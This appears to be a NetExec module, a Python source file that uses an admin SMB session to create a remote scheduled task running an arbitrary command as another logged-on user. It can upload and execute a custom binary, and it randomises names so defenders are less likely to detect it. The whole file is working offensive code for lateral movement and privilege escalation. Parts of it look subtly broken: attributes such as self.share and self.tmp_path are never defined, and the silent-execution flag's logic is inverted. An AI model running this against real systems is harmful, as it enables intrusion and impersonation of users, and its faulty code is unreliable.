import os
from traceback import format_exc
from nxc.helpers.misc import CATEGORY, gen_random_string
from nxc.protocols.smb.atexec import TSCH_EXEC


class NXCModule:
    """
    Execute a scheduled task remotely as a already connected user by @Defte_
    Thanks @Shad0wC0ntr0ller for the idea of removing the hardcoded date that could be used as an IOC
    Modified by @Defte_ so that output on multiples lines are printed correctly (28/04/2025)
    Modified by @Defte_ so that we can upload a custom binary to execute using the BINARY option (28/04/2025)
    Modified by @SGMG11 to execute the task without output
    """
    name = "schtask_as"
    description = "Remotely execute a scheduled task as a logged on user"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    @staticmethod
    def register_module_options(subparsers):
        subparsers.add_argument("--runas", help="User to execute command as", required=True)
        subparsers.add_argument("--cmd", help="Command to execute", required=True)
        subparsers.add_argument("--binary", help="Upload a binary to execute")
        subparsers.add_argument("--task", help="Name for the scheduled task", default=gen_random_string(8))
        subparsers.add_argument("--file", help="Name for the output file", default=gen_random_string(8))
        subparsers.add_argument("--location", help="Location for the output file", default="\\Windows\\Temp")
        subparsers.add_argument("--silentcommand", action="store_true", default=True, help="Execute without retrieving output")
        subparsers.set_defaults(module="schtask_as")
        return subparsers

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.run_task_as = module_options.runas
        self.command_to_run = module_options.cmd
        self.binary_to_upload = module_options.binary
        self.task_name = module_options.task
        self.output_filename = module_options.file
        self.output_file_location = module_options.location
        self.show_output = module_options.silentcommand

    def on_admin_login(self, context, connection):
        self.logger = context.log

        if self.command_to_run is None:
            self.logger.fail("You need to specify a CMD to run")
            return

        if self.run_task_as is None:
            self.logger.fail("You need to specify a USER to run the command as")
            return

        if self.show_output is False:
            self.logger.display("Command will be executed silently without output")

        if self.binary_to_upload:
            if not os.path.isfile(self.binary_to_upload):
                self.logger.fail(f"Cannot find {self.binary_to_upload}")
                return
            else:
                self.logger.display(f"Uploading {self.binary_to_upload}")
                binary_file_location = self.tmp_path if self.output_file_location is None else self.output_file_location
                with open(self.binary_to_upload, "rb") as binary_to_upload:
                    try:
                        self.binary_to_upload_name = os.path.basename(self.binary_to_upload)
                        connection.conn.putFile(self.share, f"{binary_file_location}{self.binary_to_upload_name}", binary_to_upload.read)
                        self.logger.success(f"Binary {self.binary_to_upload_name} successfully uploaded in {binary_file_location}{self.binary_to_upload_name}")
                    except Exception as e:
                        self.logger.fail(f"Error writing file to share {binary_file_location}: {e}")
                        return

        self.logger.display("Connecting to the remote Service control endpoint")
        try:
            exec_method = TSCH_EXEC(
                connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
                connection.smb_share_name,
                connection.username,
                connection.password,
                connection.domain,
                connection.kerberos,
                connection.aesKey,
                connection.host,
                connection.kdcHost,
                connection.hash,
                self.logger,
                connection.args.get_output_tries,
                connection.args.share,
                self.run_task_as,
                self.command_to_run,
                self.output_filename,
                self.task_name,
                self.output_file_location,
            )

            self.logger.display(f"Executing '{self.command_to_run}' as '{self.run_task_as}'")
            output = exec_method.execute(self.command_to_run, self.show_output)

            try:
                if not isinstance(output, str):
                    output = output.decode(connection.args.codec)
            except UnicodeDecodeError:
                # Required to decode specific French characters otherwise it'll print b"<result>"
                output = output.decode("cp437")
            if output:
                for line in output.splitlines():
                    self.logger.highlight(line.rstrip())

        except Exception:
            self.logger.debug("Error executing command via atexec, traceback:")
            self.logger.debug(format_exc())
        finally:
            if self.binary_to_upload:
                try:
                    connection.conn.deleteFile(self.share, f"{binary_file_location}{self.binary_to_upload_name}")
                    context.log.success(f"Binary {binary_file_location}{self.binary_to_upload_name} successfully deleted")
                except Exception as e:
                    context.log.fail(f"Error deleting {binary_file_location}{self.binary_to_upload_name} on {self.share}: {e}")
